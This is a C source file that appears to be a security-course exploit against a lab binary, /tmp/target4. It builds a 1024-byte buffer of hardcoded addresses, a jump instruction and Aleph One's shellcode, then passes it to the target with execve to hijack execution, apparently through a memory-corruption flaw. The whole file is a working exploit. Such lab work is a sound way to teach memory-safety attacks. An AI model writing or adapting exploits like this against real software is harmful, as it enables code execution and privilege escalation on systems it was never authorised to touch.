#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define EGG_SIZE 1024


int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;

  long shellcodeAddr, *addrPtr, fpAddr, f, f2;
  char exploitStr[EGG_SIZE]; /* string containing exploit code */
  char *ptr;
  int i;

  shellcodeAddr = 0x08049C68;
  f = 0xffffffff;
  f2 = 0xffff06eb;
  fpAddr = 0xbffffa3c;

  addrPtr = (long *) exploitStr; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = 0xffffffff;

  memcpy(&exploitStr[504], &shellcodeAddr, 4);
  memcpy(&exploitStr[508], &fpAddr, 4);
  memcpy(&exploitStr[3], &f, 4);
  memcpy(exploitStr, &f2, 2);


  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  ptr = &exploitStr[8];
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];


  exploitStr[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  args[1] = exploitStr;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
